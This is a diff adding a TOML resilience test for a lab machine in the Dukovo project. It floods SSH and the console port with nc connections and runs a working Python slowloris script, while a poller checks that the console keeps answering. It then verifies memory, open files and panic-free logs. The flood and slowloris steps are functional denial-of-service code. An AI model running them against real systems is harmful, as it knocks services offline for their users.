@@ -1,0 +1,69 @@
+# SPDX-FileCopyrightText: 2026 The Dukovo contributors
+# SPDX-License-Identifier: Apache-2.0 OR MIT
+
+# A two-minute connection flood and a slowloris run against SSH and the
+# console, from the red-team kit, while the lab PC polls the console the
+# whole time: the machine must keep answering the lab PC within a bound
+# throughout, and come out the other side with its memory, its open
+# files and its log all within bounds and no panic.
+about = "A two-minute connection flood and a slowloris run on ports 22 and 9090 never keep the console from answering the lab PC within 2 seconds; afterwards free memory and admind's open files are within 5% and 50% of what they were, and the log shows no panic"
+time = "15m"
+fresh = true
+attacker = "linux"
+host_needs = ["curl"]
+
+# lsof needs root to see another account's open files: admind runs as
+# root, and the lab account's own lsof would silently list none of them.
+[[step]]
+run = "sh -c 'grep \"^free:\" /processes/meminfo | tr -s \" \" | cut -d \" \" -f 2 > /tmp/mem-before; lsof -c admind | wc -l > /tmp/fds-before; cat /tmp/mem-before /tmp/fds-before'"
+root = true
+
+# The lab PC polls the console's health route once a second for the
+# whole flood, keeping each poll's status and time in {work}/poll.log;
+# it outlives the two attack steps below and is torn down with the test.
+[[step]]
+host = "sh -c 'end=$(($(date +%s) + 150)); : > poll.log; echo ready; while [ $(date +%s) -lt $end ]; do t0=$(date +%s); code=$(curl -sk --max-time 2 -o /dev/null -w \"%{http_code}\" https://{machine}:{machine-port:9090}/api/1/health 2> /dev/null); t1=$(date +%s); echo \"$code $((t1 - t0))\" >> poll.log; sleep 1; done; exec sleep 1'"
+background = true
+ready = "ready"
+
+# A flood of TCP connections to both ports for two minutes: more than the
+# machine's own backlog, none of them finishing a handshake's worth of
+# real work.
+[[step]]
+attack = "timeout 120 sh -c 'while true; do for p in 22 9090; do nc -z -w1 {target} $p & done; done; wait' || true"
+
+# Slowloris on the console: many sockets, each sending one header a
+# second, never finishing the request, for two minutes.
+[[step]]
+attack = "timeout 120 python3 -c \"\nimport socket, ssl, time\nsockets = []\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\nfor _ in range(200):\n    try:\n        s = ctx.wrap_socket(socket.create_connection(('{target}', 9090), timeout=5))\n        s.send(b'GET /api/1/health HTTP/1.1\\r\\nHost: {target}\\r\\n')\n        sockets.append(s)\n    except OSError:\n        pass\nend = time.time() + 110\nwhile time.time() < end:\n    for s in list(sockets):\n        try:\n            s.send(b'X-Keep-Alive: alive\\r\\n')\n        except OSError:\n            sockets.remove(s)\n    time.sleep(10)\nprint('slowloris: held', len(sockets), 'sockets')\n\""
+
+[[step]]
+host = "sh -c 'sleep 5; bad=0; while read -r code dt; do [ \"$code\" = 200 ] || bad=$((bad + 1)); [ \"$dt\" -gt 2 ] && bad=$((bad + 1)); done < poll.log; echo \"$bad bad polls\"'"
+expect = "0 bad polls"
+
+# The flood's own connections (nc's SYN probes, the slowloris sockets) take
+# a while to drain from the machine's side after it ends; this run step
+# opens a fresh SSH connection of its own, which the flood sometimes keeps
+# from answering for more than ten seconds after it stops (a finding of
+# its own: sshd's own recovery, not the console's, which the poll above
+# already held to its two-second bound throughout), so it waits longer
+# than that before racing it.
+[[step]]
+wait = "30s"
+
+# Free memory dips while the flood's connection structures are still being
+# let go; it polls for a minute, up to the bound, rather than snapshotting
+# once right after the flood and calling a reclaim in progress a leak.
+[[step]]
+run = '''sh -c 'mem_before=$(cat /tmp/mem-before); fds_before=$(cat /tmp/fds-before); i=0; while [ $i -lt 12 ]; do mem_after=$(grep "^free:" /processes/meminfo | tr -s " " | cut -d " " -f 2); fds_after=$(lsof -c admind | wc -l); if [ "$mem_after" -ge $((mem_before - mem_before / 20)) ] && [ "$fds_after" -le $((fds_before + fds_before / 2 + 10)) ]; then echo "mem $mem_before -> $mem_after; fds $fds_before -> $fds_after"; echo within-bounds; exit 0; fi; sleep 5; i=$((i + 1)); done; echo "mem $mem_before -> $mem_after; fds $fds_before -> $fds_after"; echo still-out-of-bounds' '''
+root = true
+expect = "within-bounds"
+
+# The log holds no panic: the kernel's own words are "Radix panic", a
+# program's "panicked at". The kernel's command line says `panic=10` at each
+# start, and authd logs this command's own line, which the brackets keep
+# from matching.
+[[step]]
+run = "sh -c 'log --all -g \"Radix [p]anic|[p]anicked at\"; true'"
+root = true
+expect = "-- No entries --"
